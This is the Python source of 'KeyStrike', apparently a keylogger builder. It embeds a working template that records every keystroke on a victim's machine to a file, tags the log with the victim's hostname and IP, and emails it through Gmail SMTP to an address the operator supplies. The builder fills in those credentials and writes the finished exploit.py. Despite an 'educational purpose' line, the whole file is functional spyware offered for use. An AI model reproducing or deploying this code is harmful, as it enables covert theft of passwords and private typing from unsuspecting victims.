#!/bin/usr/python3
import getpass


def prRed(skk): return "\033[91m {}\033[00m" .format(skk)
def prGreen(skk): return "\033[92m {}\033[00m" .format(skk)
def prYellow(skk): return "\033[93m {}\033[00m" .format(skk)
def prLightPurple(skk): return "\033[94m {}\033[00m" .format(skk)
def prPurple(skk): return "\033[95m {}\033[00m" .format(skk)


exploit = '''#!/bin/usr/python3

from pynput.keyboard import Key, Listener
import threading
import socket
import smtplib
from time import sleep

MAX_LEN = 30
counter = 0
space = 0

def prRed(skk): print("\\033[91m {}\\033[00m" .format(skk))
def prGreen(skk): print("\\033[92m {}\\033[00m" .format(skk))
def prYellow(skk): print("\\033[93m {}\\033[00m" .format(skk))
def prLightPurple(skk): print("\\033[94m {}\\033[00m" .format(skk))
def prPurple(skk): print("\\033[95m {}\\033[00m" .format(skk))


def press(key):
    global MAX_LEN, space, counter
    key = str(key).replace("'", "")
    if len(key) == 1:
        write_to_file(key)
        counter += 1
    elif 'space' in key:
        write_to_file(" ")
        space += 1
        counter += 1

    if counter >= MAX_LEN:
        counter = 0
        write_to_file("\\n")
    if space > 3:
        space = 0
        write_to_file("\\n")


def release(key):
    if key == Key.esc:
        return False


def write_to_file(keys):
    with open('key.txt', 'a') as fb:
        fb.write(keys)


def get_keys():
    with Listener(on_press=press, on_release=release) as listener:
        listener.join()


def get_host_name_and_ip():
    hostname = socket.gethostname()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))
    local_ip_address = s.getsockname()[0]
    return hostname, local_ip_address


def keylogger():
    f = open("key.txt", "w")
    header = """
+---------------------------------------------+                     
   KeyStrike  : v1.0                                          
   Victim_Hostname : {0}                       
   Ip_address : {1}                     
+---------------------------------------------+\\n
""".format(get_host_name_and_ip()[0], get_host_name_and_ip()[1])
    f.write(header)
    f.close()
    get_keys()


def send_email():
    username = "$USERNAME"
    password = "$PASSWORD"
    From = username
    To = "$EMAIL"
    Subject = "Keys from Host : " + get_host_name_and_ip()[0]
    try:
        f = open("key.txt", 'r').read().strip()
        msg = """From: {0}\\nTo: {1}\\nSubject: {2}\\n\\n{3}""".format(From, To, Subject, f)
    except:
        print("Error in reading key.txt file.")

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(username, password)
        server.sendmail(From, To, msg)
        server.close()
        prGreen("[*] Message Successfully Sent!!!")
    except:
        prRed("[*] Message not sent.Username or password wrong!!")


while True:
    if __name__ == "__main__":

        keys = threading.Thread(target=keylogger)
        email = threading.Thread(target=send_email)

        keys.start()
        sleep(30.0)
        email.start()
        email.join()

'''


def generate_keylogger_exploit(username, password, email):
    global exploit
    dic = {"$USERNAME": username, "$PASSWORD": password, "$EMAIL": email}
    for x, y in dic.items():
        exploit = exploit.replace(x, y)
    f = open("exploit.py", "w")
    f.write(exploit)
    f.close()


def banner():
    banner = """
 ██ ▄█▀▓█████▓██   ██▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
 ██▄█▒ ▓█   ▀ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
▓███▄░ ▒███    ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
▓██ █▄ ▒▓█  ▄  ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
▒██▒ █▄░▒████▒ ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
░ ░▒ ▒░ ░ ░  ░▓██ ░▒░ ░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░
░ ░░ ░    ░   ▒ ▒ ░░  ░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░   
░  ░      ░  ░░ ░           ░              ░      ░  ░  ░      ░  ░
              ░ ░    __author__ : dr3dd
                       version  : v1.0
                       Site     : http://dr3dd.me
 Only for educational purpose.   Copyright (C) 2019 KeyStrike @dr3dd                                         
    """
    print(prLightPurple(banner))


if __name__ == "__main__":
    banner()
    username = input(prGreen("Enter Email : "))
    password = getpass.getpass(prGreen("Enter password : "))
    email = input(prGreen("Enter email where you want to receive keys : "))
    generate_keylogger_exploit(username, password, email)
    print(prLightPurple("Your exploit is ready : exploit.py"))
